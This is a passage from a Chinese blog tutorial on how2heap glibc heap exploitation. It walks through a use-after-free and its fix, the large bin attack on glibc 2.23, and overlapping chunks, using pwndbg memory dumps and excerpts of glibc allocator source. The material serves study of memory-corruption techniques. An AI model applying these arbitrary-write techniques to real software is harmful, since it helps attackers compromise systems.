data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-20.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-21.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-22.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=1129&originalType=binary&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-23.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=573&originalType=binary&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p>
<h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-24.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=817&originWidth=1905&originalType=binary&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var1</span><br><span class="line"><span class="number">0x7ffffffed9d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079b0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p1<span class="number">-6</span></span><br><span class="line"><span class="number">0x8006fe0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8006ff0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000431</span> &lt;-- p1</span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-6</span></span><br><span class="line"><span class="number">0x8007440</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007450</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3<span class="number">-6</span></span><br><span class="line"><span class="number">0x8007980</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007990</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80079a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p3</span><br><span class="line"><span class="number">0x80079b0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3+(<span class="number">0x510</span>/<span class="number">8</span>)<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007eb0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020151</span>  &lt;-- top</span><br><span class="line"><span class="number">0x8007ec0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007ed0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007ee0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-25.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000431</span>  &lt;-- p1 [be freed]</span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x0000000008007460</span></span><br><span class="line"><span class="number">0x8007020</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2 [be freed]</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000008007000</span>      <span class="number">0x00007fffff3f3b78</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>类似这样<img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=906&originalType=binary&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-26.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" alt="image.png"><br>过程如下：</p>
<ul>
<li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li>
<li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li>
<li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li>
<li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li>
<li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li>
</ul>
<p>此时的内存布局如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>&lt;p1<span class="number">-2</span> <span class="number">0x00000000000000a1</span>&lt;-- p1<span class="number">-1</span></span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x00007fffff3f3f68</span>      <span class="number">0x00007fffff3f3f68</span></span><br><span class="line"><span class="number">0x8007020</span>:      <span class="number">0x0000000008007000</span>      <span class="number">0x0000000008007000</span></span><br><span class="line"><span class="number">0x8007030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007040</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007050</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007060</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007070</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007080</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007090</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000391</span>  &lt;-- p1<span class="number">-2</span> [be freed]</span><br><span class="line"><span class="number">0x80070b0</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007fffff3f3b78</span>  &lt;-- fd, bk</span><br><span class="line"><span class="number">0x80070c0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070d0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070e0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80070f0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007100</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007110</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007120</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007130</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2<span class="number">-2</span> [be freed]</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x00007fffff3f3fa8</span>      <span class="number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk</span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize</span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">      [ ... ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">              [ ... ]</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">              &#123;</span><br><span class="line">                  [ ... ]</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              [ ... ]</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      [ ... ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-27.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-28.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-29.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9c0</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9a8</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-30.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079a0</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079a0</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3<span class="number">-2</span></span><br><span class="line"><span class="number">0x80079a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x80079b0</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x00007ffffffed9c0</span></span><br><span class="line"><span class="number">0x80079c0</span>:      <span class="number">0x0000000008007460</span>      <span class="number">0x00007ffffffed9a8</span></span><br><span class="line"><span class="number">0x80079d0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var1</span><br><span class="line"><span class="number">0x7ffffffed9d0</span>: <span class="number">0x00000000080079a0</span>      <span class="number">0x00000000080079b0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var2</span><br><span class="line"><span class="number">0x7ffffffed9c8</span>: <span class="number">0x00000000080079a0</span>      <span class="number">0x00000000080079a0</span></span><br></pre></td></tr></table></figure>

<p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p>
<ul>
<li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li>
<li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li>
</ul>
<p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-31.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=840&originalType=binary&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-32.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=855&originalType=binary&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-33.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=849&originalType=binary&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</span><br><span class="line"><span class="comment">// then</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>也就是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">*(addr2+<span class="number">4</span>) = victim;</span><br></pre></td></tr></table></figure>

<p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p>
<ul>
<li>可以修改一个 large bin chunk 的 data</li>
<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
</ul>
<h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-34.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1091&originalType=binary&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-35.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=572&originalType=binary&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-36.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1049&originalType=binary&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-37.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=634&originWidth=1086&originalType=binary&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-38.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1317&originalType=binary&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-39.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1183&originalType=binary&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-40.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=893&originWidth=1307&originalType=binary&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-41.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=793&originWidth=1141&originalType=binary&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

